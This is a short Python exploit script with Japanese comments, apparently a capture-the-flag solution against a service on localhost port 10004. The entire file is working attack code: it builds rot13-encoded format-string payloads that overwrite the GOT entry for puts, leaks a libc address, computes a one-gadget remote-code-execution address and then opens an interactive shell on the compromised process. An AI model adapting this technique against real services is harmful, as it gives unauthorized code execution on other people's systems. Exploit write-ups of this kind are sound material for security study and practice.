import socket, struct, time, codecs, telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 10004))

# valueを0x404018（GOTのputs）に書き込む書式文字列を作成
# 先頭は'%43$016lx'に固定
def make(value):
  # 書式文字列
  s = '%43$016lx'
  # 出力の長さ
  n = 16

  for i in range(8):
    # 追加で出力する文字数
    t = (value&0xff)-n%256
    if t<=1:
      t += 256
    s += '%{}c%{}$hhn'.format(t, 24+i)
    value >>= 8
    n += t

  s += '\0'*(128-len(s))
  s = bytes(s, 'ascii')
  for i in range(8):
    s += struct.pack('<Q', 0x404018+i)

  # rot13
  s = s.decode('latin-1')
  s = codecs.decode(s, 'rot13')
  s = s.encode('latin-1')
  return s

main = 0x4011e1
s.sendall(make(main)+b'\n')

time.sleep(1)
d = s.recv(9999)
start_main = int(d[:16], 16)
print('__libc_start_main:', hex(start_main))
rce = (start_main
  - 0x270b3   # __libc_start_main
  + 0xe6af1)  # One-gadget RCE
s.sendall(make(rce)+b'\n')

# Telnetが非ASCII文字を読み込むと落ちるので、ここで読み飛ばす
time.sleep(1)
s.recv(9999)

t = telnetlib.Telnet()
t.sock = s
t.interact()
